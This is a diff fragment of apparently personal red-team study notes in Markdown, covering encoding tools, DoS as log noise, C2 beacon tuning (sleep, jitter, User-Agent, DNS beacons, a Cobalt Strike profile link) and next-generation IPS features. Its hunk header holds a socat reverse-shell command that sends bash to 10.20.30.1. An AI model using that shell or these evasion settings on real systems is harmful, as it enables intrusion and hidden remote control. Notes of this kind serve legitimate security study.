@@ -370,5 +370,18 @@ socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
   - base64 
   - urlencode
   - [Cyberchef](https://icyberchef.com/)
-- Encrypt
-  - 
+- DoS
+  - legitim traffic = overload capacitiy
+  - not-malicious traffic, that goes to log
+- C2: change settings
+  - User-Agent
+  - sleep-time
+  - jitter = randomness to sleep time
+  - ssl certificate 
+  - DNS beacon
+  - [Cobalt Guideline](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
+- NGNIPS
+  - context awareness
+  - application layer
+  - content awareness
+  - agile engine
